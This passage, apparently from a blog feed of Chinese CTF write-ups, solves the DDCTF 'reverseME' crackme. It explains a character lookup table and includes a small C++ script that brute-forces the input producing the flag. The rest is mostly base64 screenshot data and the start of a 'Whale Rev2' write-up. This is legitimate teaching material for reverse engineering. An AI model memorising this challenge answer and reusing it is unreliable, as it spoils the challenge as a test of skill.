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
RgrFP/8/4YPI89haZCEAAAAASUVORK5CYII='/><br>发现该地址下面是程序内容，没有单一字符，但是在该地址不远处有一串可以输入的字符集，发现字符集的地址与<code>0x402FF8</code>做差为32，刚好是最小的字符所对应的ascii码数值。<br>接下来便是找到每一个输入的字符的ascii码减去31后对应的字符，然后将其按“<code>DDCTF&#123;reverseME&#125;</code>”的形式连起来便拿到flag。<br>写一个小脚本，如下：</p>
<pre><code>#include&lt;iostream&gt;
using namespace std;
int main()
&#123;
    char a[]=&quot;1~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]1[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(&quot;;
    char b[16];
    int i;
    char c[]=&quot;DDCTF&#123;reverseME&#125;&quot;;
    for(i=0;i&lt;16;i++)
    &#123;
        for(char n=&#39;!&#39;;n&lt;126;n++)
        &#123;
            b[i]=a[(int)n-31];
            if(b[i]==c[i])
             &#123;
                 cout&lt;&lt;n;
                 break;
             &#125;
        &#125;
    &#125;
    cout&lt;&lt;endl;
    return 0;
&#125;
</code></pre>]]></content>
      <categories>
        <category>Re</category>
      </categories>
      <tags>
        <tag>Re</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>(Whale 蓝鲸)Rev2</title>
    <url>/2019/04/20/(whale%20%E8%93%9D%E9%B2%B8)rev2/</url>
    <content><![CDATA[<p>打开程序运行一下：</p>
<p><img src='data:img/jpg;base64,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
1Ohw5r8flked/dArUsl4ZCBV39ZWL/pfmkrBAOarwrOqs3Mfz5y5uTmERU273/H69XRN9eeXf96p
jVHbKuwi1yWdti+4c9GiRVevXbt27fq169cqKmzF9uCsbfU7IqFsl4rH5290Supk7krGCZ/6qG9m
eNj4j7ez1jGSuTigPoGosrGtviesT4Lw+Cyu6We1Vd4zjo8MOd3ZvnDzVee0y4bkdEl6JB4XiQ8N
iYgkh6Y9A8k4nMZGfX5VOOl2TAwnk07f6kTPqKN1ucJ8x/xGE/M2rnp9ipQUaaJibSLZVysU0s8b
dg1lzpVp9PtyX0Uj3XgkYdqdqT0++xnCceNUHfPCsPj87sRQwtxBLamTcXE1Zk/20ft8xkVkeaN/
+WhPzojntMtz1rY2moZq9SNNjYqIo7a1cbSnZ1TvfzS9tSID8aTEIw5/o5zMTBIsuvvWog9OXW2R
vwLnco8MDTl9+lthIpnMfV8ZL5WxZ/OutD05C94qdfXDYf2Klh5PNllrz6aNjjuXe2Qorvc6Wj+v
s7bR/ETFu9actY2uHlMFlmuqtcDNfVzcYGameZ+u+nqPaAdqedQOy630SvSppo1OpzTWx8PaJ8uN
CwYw42b4Oo7FHDhwoPDa4Fp8vOXXBrelrX4iJhwOt7W1WRfX+/p9S+4rXF5RUVFRUXH92rXrmR0m
k8l/u+6L999//81VNiM/bGL1jO5EKOH2N4qeGQvOJdXPbtHu5E9EzD3zd7rPru+/3jkU187fzAwK
Frn2uOXJuTPbaFY1TVWC+SxV7ZyVomPWxlk0eWEx5/R10yBx4Z48Pn+jZOY0WlxROpsqLc5YnvIo
XfXG62OeiTkQt3ztM7sdnqjLOXE3X069edtn33y5V/68PS93GbyR5oSZuto6ANwOxdLgtLPjxYsX
z507d73okLShoqJiyZIl99xzz3RrzZj5X2SbA78BV/JDuGHqyFRoZMe8855Lewi36dln125v657n
NvP/5wp/EQcAZpNblh2BKdFjhfnNdNUpzmwBMKsVS4M3eZ41UETh7zkC88lN/mghAMwa0z/PGgAA
APMV2REAAACqyI4AAABQlc2OH/7w2Wd/+GH23v9fmnIAAABQxuh3BAAAgCq7/PSlL21/U7/39S/t
FRGRxYsXt/3fpSsKAAAAZckuv//C22+/IPLhD599UV78q6//johI+P/5k1IXBgAAgLJT9PqOixcv
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
